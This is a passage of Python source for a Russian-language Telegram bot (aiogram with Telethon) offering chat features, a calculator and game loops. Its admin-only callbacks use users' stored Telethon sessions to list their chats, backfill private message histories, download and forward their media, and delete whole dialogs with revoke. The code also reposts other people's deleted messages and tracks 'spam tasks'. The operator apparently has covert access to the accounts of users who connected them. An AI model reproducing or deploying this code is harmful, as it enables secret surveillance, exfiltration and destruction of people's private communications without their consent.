    client = telethon_clients.get(u)
    if not client:
        sess = get_session(u)
        if sess:
            await callback.answer("⏳ Поднимаю клиент…", show_alert=False)
            client = await start_telethon_listener(u, sess)
    if not client:
        await callback.answer("❌ Нет Telethon-сессии — скачать нельзя", show_alert=True)
        return

    header = await callback.message.answer(
        f"📸 <b>Медиа чата</b>\nТип: <code>{mtype}</code> | всего: <code>{total}</code> | стр. {page+1}/{(total-1)//per+1}",
        parse_mode="HTML")

    sent = 0
    for msg_id, media_type, sender_id, sender_name, created_at in chunk:
        try:
            m = await client.get_messages(cid, ids=msg_id)
            if not m or not getattr(m, "media", None):
                continue
            path = await client.download_media(m, file=f"/tmp/__med_{u}_{cid}_{msg_id}")
            if not path:
                continue
            cap = f"#{msg_id} · {media_type} · {sender_name or sender_id}"
            try:
                if media_type == "photo":
                    await callback.message.answer_photo(FSInputFile(path), caption=cap)
                elif media_type == "video":
                    await callback.message.answer_video(FSInputFile(path), caption=cap)
                elif media_type == "audio":
                    await callback.message.answer_audio(FSInputFile(path), caption=cap)
                elif media_type == "sticker":
                    await callback.message.answer_sticker(FSInputFile(path))
                else:
                    await callback.message.answer_document(FSInputFile(path), caption=cap)
                sent += 1
            except TelegramBadRequest as tbe:
                await callback.message.answer(
                    f"⚠️ #{msg_id} слишком большой ({tbe.message}). Лежит: <code>{path}</code>",
                    parse_mode="HTML")
            try: os.remove(path)
            except: pass
            await asyncio.sleep(0.6)
        except FloodWaitError as fw:
            await asyncio.sleep(fw.seconds + 1)
        except Exception as ex:
            logging.warning(f"media send {msg_id}: {ex}")

    try:
        await header.edit_reply_markup(reply_markup=_media_nav_kb(u, cid, page, total, mtype))
    except: pass
    await callback.answer(f"✅ {sent}")

@dp.callback_query()
async def process_callbacks(callback: CallbackQuery, state: FSMContext):
    data = callback.data; uid = callback.from_user.id
    if data.startswith(("child_", "kill_", "killm_", "killok_", "killcancel_", "killmenu_", "showchild_",
                        "check_sub", "marry_", "propose_role_", "media_")): return
    if data == "noop": await callback.answer("—"); return
    if data == "btn_features":
        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML"); await callback.answer(); return
    if data == "btn_how_to_connect": await how_to_connect(callback); return
    if data == "btn_group_auth": await group_auth(callback, state); return
    if data == "btn_admin_panel":
        if uid != ADMIN_ID: await callback.answer(); return
        await callback.message.answer("👑", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return
    if uid != ADMIN_ID: await callback.answer(); return

    if data.startswith("live_chats_"):
        parts = data.split("_"); u = int(parts[2]); p = int(parts[3])
        chats = get_user_chats(u)
        try: await callback.message.edit_text(f"📋 Чаты: <code>{len(chats)}</code>",
                                              reply_markup=get_user_chats_live_keyboard(u, p), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data.startswith("opnch_"):
        parts = data.split("_"); u = int(parts[1]); cid = int(parts[2])
        text, total = format_chat_messages(u, cid, 0)
        if total == 0:
            client = telethon_clients.get(u)
            if not client:
                sess = get_session(u)
                if sess: client = await start_telethon_listener(u, sess)
            if client:
                await callback.answer("⏳...", show_alert=False)
                await backfill_one_chat(client, u, cid, limit=100)
                text, total = format_chat_messages(u, cid, 0)
        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
                                              parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        await callback.answer(); return

    if data.startswith("pgchat_"):
        parts = data.split("_"); u = int(parts[1]); cid = int(parts[2]); p = int(parts[3])
        text, total = format_chat_messages(u, cid, p)
        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, p, total),
                                              parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        await callback.answer(); return

    if data.startswith("bfchat_"):
        parts = data.split("_"); u = int(parts[1]); cid = int(parts[2])
        client = telethon_clients.get(u)
        if not client:
            sess = get_session(u)
            if sess: client = await start_telethon_listener(u, sess)
        if not client: await callback.answer("❌ Нет сессии", show_alert=True); return
        await callback.answer("⏳", show_alert=False)
        await backfill_one_chat(client, u, cid, limit=200)
        text, total = format_chat_messages(u, cid, 0)
        try: await callback.message.edit_text(text, reply_markup=get_chat_view_keyboard(u, cid, 0, total),
                                              parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        await callback.answer(); return

    if data.startswith("askdel_"):
        parts = data.split("_"); u = int(parts[1]); cid = int(parts[2])
        chats = get_user_chats(u); cn = next((n for i, n in chats if i == cid), str(cid))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Удалить", callback_data=f"cnfdel_{u}_{cid}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"opnch_{u}_{cid}")]])
        try: await callback.message.edit_text(f"⚠️ Удалить «{cn}»?", reply_markup=kb)
        except: pass
        await callback.answer(); return

    if data.startswith("cnfdel_"):
        parts = data.split("_"); u = int(parts[1]); cid = int(parts[2])
        client = telethon_clients.get(u)
        if not client:
            sess = get_session(u)
            if sess: client = await start_telethon_listener(u, sess)
        ok = False; err = None
        if client:
            try:
                try:
                    ids = []
                    async for m in client.iter_messages(cid, limit=500): ids.append(m.id)
                    if ids: await client.delete_messages(cid, ids, revoke=True)
                except: pass
                try: await client.delete_dialog(cid, revoke=True)
                except TypeError: await client.delete_dialog(cid)
                ok = True
            except Exception as e: err = str(e)
        else:
            bc_id = chat_to_bc.get((u, cid))
            if bc_id: ok = True
            else: err = "Нет способа"
        if ok:
            clear_chat_messages(u, cid); delete_user_chat(u, cid)
            await callback.answer("✅ Готово", show_alert=True)
        else: await callback.answer(f"❌ {err}", show_alert=True)
        chats = get_user_chats(u)
        try: await callback.message.edit_text(f"📋 Чаты: <code>{len(chats)}</code>",
                                              reply_markup=get_user_chats_live_keyboard(u, 0), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data == "admin_panel_back":
        try: await callback.message.edit_text("👑", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data == "admin_stats":
        bu = get_business_accounts(); mu = get_all_users()
        tm = len([u for u in mu if u[4] == 'manual'])
        tc = sum(count_user_chats(u[0]) for u in mu)
        tmsg = sum(count_user_messages(u[0]) for u in mu)
        sc = len(get_all_sessions())
        try:
            await callback.message.edit_text(
                f"📊 <b>СТАТИСТИКА:</b>\n\n• Бизнес: <code>{len(bu)}</code>\n• Ручных: <code>{tm}</code>\n"
                f"• Сессий: <code>{sc}</code>\n• Клиентов: <code>{len(telethon_clients)}</code>\n"
                f"• Чатов: <code>{tc}</code>\n• Сообщений: <code>{tmsg}</code>\n"
                f"• Спам-тасков: <code>{len(active_spam_tasks)}</code>",
                reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data == "admin_users":
        try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(0), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data.startswith("users_page_"):
        p = int(data.split("_")[2])
        try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(p), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data.startswith("user_"):
        u = int(data.split("_")[1])
        cc = count_user_chats(u); mc = count_user_messages(u)
        sess = get_session(u)
        online = "🟢" if u in telethon_clients else "⚪"
        sstat = "🔑" if sess else "🚫"
        rows = [[InlineKeyboardButton(text=f"📋 Чаты ({cc})", callback_data=f"live_chats_{u}_0")]]
        if sess:
            rows.append([InlineKeyboardButton(text="🔄 Поднять", callback_data=f"restart_client_{u}")])
            rows.append([InlineKeyboardButton(text="📥 История", callback_data=f"fullbf_{u}")])
        rows.append([InlineKeyboardButton(text="❌ Удалить", callback_data=f"delete_user_{u}")])
        rows.append([InlineKeyboardButton(text="🚫 Бан", callback_data=f"ban_user_{u}")])
        rows.append([InlineKeyboardButton(text="🔙", callback_data="admin_users")])
        try: await callback.message.edit_text(
            f"👤 ID: <code>{u}</code>\nИмя: {get_user_mention(u)}\nКлиент: {online}\nTelethon: {sstat}\n"
            f"Чатов: <code>{cc}</code>\nСообщений: <code>{mc}</code>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    if data.startswith("restart_client_"):
        u = int(data.split("_")[2])
        sess = get_session(u)
        if not sess: await callback.answer("❌", show_alert=True); return
        await callback.answer("⏳", show_alert=False)
        if u in telethon_clients:
            try: await telethon_clients[u].disconnect()
            except: pass
            del telethon_clients[u]
        c = await start_telethon_listener(u, sess)
        await callback.message.answer("✅" if c else "❌")
        return

    if data.startswith("fullbf_"):
        u = int(data.split("_")[1])
        c = telethon_clients.get(u)
        if not c:
            sess = get_session(u)
            if sess: c = await start_telethon_listener(u, sess)
        if not c: await callback.answer("❌", show_alert=True); return
        await callback.answer("⏳", show_alert=False)
        msg = callback.message
        async def _run():
            try:
                await backfill_dialogs(c, u, max_dialogs=300, per_chat=50)
                await msg.answer("✅")
            except: pass
        asyncio.create_task(_run()); return

    if data.startswith("delete_user_"):
        u = int(data.split("_")[2]); delete_business_account(u)
        await callback.answer("✅", show_alert=True)
        try: await callback.message.edit_text("👥", reply_markup=get_users_keyboard(0), parse_mode="HTML")
        except: pass
        return

    if data.startswith("ban_user_"):
        u = int(data.split("_")[2])
        if u in banned_users: set_user_ban(u, False); await callback.answer("✅ Разбанен!", show_alert=True)
        else: set_user_ban(u, True); await callback.answer("🚫 Забанен!", show_alert=True)
        cc = count_user_chats(u)
        try: await callback.message.edit_text(
            f"👤 ID: <code>{u}</code>\nЗабанен: {u in banned_users}\nЧатов: {cc}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"📋 Чаты ({cc})", callback_data=f"live_chats_{u}_0")],
                [InlineKeyboardButton(text="🚫 Бан/Разбан", callback_data=f"ban_user_{u}")],
                [InlineKeyboardButton(text="🔙", callback_data="admin_users")]]),
            parse_mode="HTML")
        except: pass
        return

    if data == "admin_ban_prompt":
        try: await callback.message.edit_text("🚫 /ban 123456789\n/unban 123456789",
                                              reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    await callback.answer()

async def resolve_user_id(raw):
    raw = raw.strip()
    if raw.startswith("@"): return user_usernames.get(raw.lstrip("@").lower())
    if raw.isdigit(): return int(raw)
    return None

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        a = message.text.split(maxsplit=1)[1]
        t = await resolve_user_id(a)
        if t: set_user_ban(t, True); delete_business_account(t); await message.answer("🚫")
    except: pass

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        a = message.text.split(maxsplit=1)[1]
        t = await resolve_user_id(a)
        if t: set_user_ban(t, False); await message.answer("✅")
    except: pass

@dp.message(Command("restore"))
async def cmd_restore(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("⏳...")
    await restore_all_sessions()
    await message.answer(f"✅ Клиентов: <b>{len(telethon_clients)}</b>", parse_mode="HTML")

@dp.update()
async def global_update_handler(update: Update, bot: Bot):
    try:
        if update.deleted_business_messages:
            d = update.deleted_business_messages
            bc_id = d.business_connection_id; ids = set(d.message_ids)
            for (ccid, cmid), cached in list(msg_cache.items()):
                if cmid in ids:
                    u = cached['user_id']
                    if u == bot_id: msg_cache.pop((ccid, cmid), None); continue
                    kw = {"chat_id": ccid, "text": f"👤 {get_user_mention(u, cached['user'])} <b>удалил(а):</b>\n\n💬 {cached['text']}", "parse_mode": "HTML"}
                    bt = bc_id or cached.get("bc_id")
                    if bt: kw["business_connection_id"] = bt
                    await bot.send_message(**kw); msg_cache.pop((ccid, cmid), None)
    except: pass

@dp.message()
@dp.business_message()
async def handle(message: Message):
    global bot_id, bot_user_id
    try:
        if not message.from_user or message.from_user.is_bot: return
        uid = int(message.from_user.id)
        chat_id = int(message.chat.id)
        bc_id = message.business_connection_id
        save_user_info(uid, message.from_user.username, message.from_user.first_name)
        owner_id = bc_owners.get(bc_id) if bc_id else None

        if bc_id:
            if bc_id not in bc_owners:
                try:
                    ci = await bot.get_business_connection(bc_id)
                    bc_owners[bc_id] = int(ci.user.id); owner_id = int(ci.user.id)
                    owner_to_bc[int(ci.user.id)] = bc_id
                    save_user_info(ci.user.id, ci.user.username, ci.user.first_name)
                    save_business_account(ci.user.id, ci.user.username, ci.user.first_name)
                except: pass
            if owner_id:
                chat_name = message.chat.title or message.chat.first_name or "Чат"
                save_user_chat(owner_id, chat_id, chat_name)
                chat_to_bc[(owner_id, chat_id)] = bc_id
                chat_to_owner[chat_id] = owner_id
                if message.chat.type == "private" and uid != owner_id:
                    user_names[chat_id] = message.from_user.first_name or "Собеседник"
                    user_names[uid] = message.from_user.first_name or "Собеседник"
                if message.text:
                    mt, hm = None, False
                    try:
                        if message.photo: mt, hm = "photo", True
                        elif message.video: mt, hm = "video", True
                        elif message.document: mt, hm = "document", True
                        elif message.voice: mt, hm = "audio", True
                        elif message.sticker: mt, hm = "sticker", True
                    except: pass
                    save_chat_message(owner_id, chat_id, uid, message.from_user.first_name or "User",
                                      message.from_user.username or "", message.text, message.message_id, mt, hm)
                else:
                    mt, hm = None, False
                    try:
                        if message.photo: mt, hm = "photo", True
                        elif message.video: mt, hm = "video", True
                        elif message.document: mt, hm = "document", True
                        elif message.voice: mt, hm = "audio", True
                        elif message.sticker: mt, hm = "sticker", True
                    except: pass
                    if hm:
                        save_chat_message(owner_id, chat_id, uid, message.from_user.first_name or "User",
                                          message.from_user.username or "", "[📎 медиа]", message.message_id, mt, hm)

        if uid in banned_users or (owner_id and owner_id in banned_users): return
        if bot_id is None:
            me = await bot.get_me(); bot_id = me.id; bot_user_id = me.id
        if bc_id: active_chats.setdefault(bc_id, set()).add(chat_id)

        if message.text:
            ck = (chat_id, message.message_id)
            msg_cache[ck] = {"text": message.text, "user": message.from_user.first_name or "Пользователь",
                             "user_id": uid, "chat_id": chat_id, "bc_id": bc_id}
            if len(msg_cache) > 5000: msg_cache.pop(next(iter(msg_cache)))

        in_private_bot = False
        is_group = message.chat.type in ("group", "supergroup", "channel")

        if is_group:
            hnd = owner_id if owner_id else uid
            if hnd in telethon_clients: return
            if bc_id:
                is_from_me = True; co = owner_id or uid
            else: return
        else:
            if bc_id:
                is_from_me = True; co = owner_id or uid
            else:
                is_from_me = True; co = uid; in_private_bot = True

        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id); return
        if not is_from_me: return
        if chat_id in reply_guard_chats and message.reply_to_message:
            await delete_msg(chat_id, message.message_id, bc_id); return

        if in_private_bot and uid != ADMIN_ID:
            text_raw = message.text or ""
            if not text_raw.startswith("/start"):
                if not await check_subscription(uid):
                    await require_subscription(message); return

        text_raw = message.text
        if not text_raw: return

        if is_calc_expr(text_raw):
            r, err = calculate_expression(text_raw)
            if r is not None:
                f = f"{r:.10f}".rstrip('0').rstrip('.') if isinstance(r, float) else str(r)
                nt = f"{text_raw} = <b>{f}</b>"
                ok = await edit_message(chat_id, message.message_id, nt, bc_id, parse_mode="HTML")
                if not ok:
                    try:
                        kw = {"chat_id": chat_id, "text": nt, "parse_mode": "HTML"}
                        if bc_id: kw["business_connection_id"] = bc_id
                        await bot.send_message(**kw)
                    except: pass
                return
            elif err:
                try:
                    kw = {"chat_id": chat_id, "text": err, "parse_mode": "HTML"}
                    if bc_id: kw["business_connection_id"] = bc_id
                    await bot.send_message(**kw)
                except: pass
                return

        async def send_reply_aiogram(txt):
            try:
                kw = {"chat_id": chat_id, "text": txt, "parse_mode": "HTML"}
                if bc_id: kw["business_connection_id"] = bc_id
                await bot.send_message(**kw)
            except: pass

        handled = await process_command_text(text_raw, co, chat_id, bc_id=bc_id,
                                             aiogram_message=message, in_private_bot=in_private_bot,
                                             send_reply=send_reply_aiogram)
        if handled:
            await clear_cmd(chat_id, message.message_id, bc_id); return

        ft, modified = apply_modifications(text_raw, chat_id, message.entities)
        if modified:
            await edit_message(chat_id, message.message_id, ft, bc_id, parse_mode="HTML")
    except Exception as e: logging.error(f"handle: {e}", exc_info=True)

async def handle_ping(request): return web.Response(text="OK")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping); app.router.add_get('/health', handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    await web.TCPSite(runner, "0.0.0.0", port).start()

async def main():
    global bot_user_id
    init_pool(); init_db()
    await start_web_server()
    try: await bot.delete_webhook(drop_pending_updates=True)
    except: pass
    me = await bot.get_me(); bot_user_id = me.id
    await restore_all_sessions()
    asyncio.create_task(global_typing_loop())
    asyncio.create_task(child_decay_loop())
    asyncio.create_task(child_birthday_loop())
    asyncio.create_task(night_3am_loop())
    logging.info("🚀 БОТ ЗАПУЩЕН!")
    await dp.start_polling(bot, allowed_updates=[
        "message", "business_connection", "business_message",
        "edited_business_message", "deleted_business_messages", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())
